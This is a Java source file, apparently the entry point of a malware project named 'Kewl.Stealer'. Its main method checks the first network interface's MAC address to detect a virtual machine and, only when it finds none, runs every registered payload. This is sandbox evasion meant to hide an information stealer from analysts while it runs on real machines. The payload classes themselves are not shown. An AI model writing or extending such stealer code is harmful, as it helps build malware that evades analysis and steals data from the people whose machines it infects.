package Kewl.Stealer;

import java.net.NetworkInterface;
import java.util.Enumeration;

import Kewl.Stealer.payload.IPayload;
import Kewl.Stealer.util.MacUtil;

public class Main {
    public static void main(String[] args) {
        if (!isVM()) {
            for(IPayload payload : IPayload.getPayloads()) {
                payload.run();
            }
        }
    }

    public static boolean isVM() {
        try {
            Enumeration<NetworkInterface> net = null;
            net = NetworkInterface.getNetworkInterfaces();
            if (net.hasMoreElements()) {
                NetworkInterface element = (NetworkInterface)net.nextElement();
                return MacUtil.isVMMac(element.getHardwareAddress());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }
}